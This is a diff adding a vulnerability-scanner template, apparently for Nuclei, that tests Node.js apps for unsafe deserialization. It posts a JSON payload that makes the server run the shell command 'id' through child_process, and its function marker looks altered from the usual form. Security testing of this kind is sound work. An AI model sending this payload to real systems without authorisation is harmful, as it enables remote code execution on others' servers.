@@ -1,0 +1,14 @@
+id: K70n0s510-node-rce
+info:
+  name: Node.js Unserialization RCE
+  author: K70n0s510
+  severity: critical
+  tags: a08,node,rce
+http:
+  - method: POST
+    path: ["{{BaseURL}}/"]
+    headers: {Content-Type: "application/json"}
+    body: '{"rce":"_1177ND_FUNC1177_function (){require(\"child_process\").exec(\"id\", function(error, stdout, stderr) { console.log(stdout) });}()"}'
+    matchers:
+      - type: regex
+        regex: ["uid=[0-9]+.*gid=[0-9]+"]
